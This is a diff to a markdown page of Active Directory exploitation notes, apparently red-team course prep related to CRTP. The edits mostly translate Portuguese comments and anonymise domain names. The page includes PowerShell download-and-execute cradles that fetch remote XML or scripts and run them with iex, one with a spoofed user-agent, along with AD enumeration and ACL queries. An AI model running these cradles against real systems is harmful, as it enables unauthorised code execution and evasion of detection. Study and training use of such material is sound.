@@ -20,7 +20,7 @@ toc: true
 
 # Active Directory Exploitation 
 
-> This is a Brazilian course that can be used as a PREP for CRTP
+> This can be used as an intro for Active Directory Security Content (CRTP for example)
 
 > I've sorted in 4 chapters: Powershell, Bloodhound, Privesc and Lateral Movement
 
@@ -110,11 +110,11 @@ Kali: open a webserver with a xml file:
 Target:
 ```powershell
 $docxml = New-Object System.Xml.XmlDocument
-$docxml.Load("http://ip/arquivo.xml"); 
+$docxml.Load("http://ip/file.xml"); 
 iex $docxml.command.a.execute 
 ```
 
-Especify user-agent: permite camuflar requisições
+Especify user-agent: allows disguising requests
 ```powershell
 $variable.Headers.Add("user-agent","redteam")
 iex $variable.DownloadString($address,$path)
@@ -194,9 +194,9 @@ Foreach($prop in $obj.Properties) {$prop}
 Write-Host "---------"}
 ```
 
-> 805306369 - enumerar todas as contas de usuario
+> 805306369 - enum all user accounts
 
-> 805306368 - enumerar todas as maquinas de usuario
+> 805306368 - enum all user machines 
 
 ```powershell
 change tab name = $host.UI.RawUI.WindowTitle = “AD-MODULE”
@@ -307,7 +307,7 @@ permission to keep an eye:
  
 **ADModule**:
 ```powershell
-(Get-ACL ‘AD:\CN=Administrator,CN=Users,DC=alunos,DC=sec4us,DC=local’).Access
+(Get-ACL ‘AD:\CN=Administrator,CN=Users,DC=alunos,DC=domain,DC=local’).Access
 
 > PowerView
 Get-ObjectAcl -samAccountName <user> [-ResolveGUIDs]
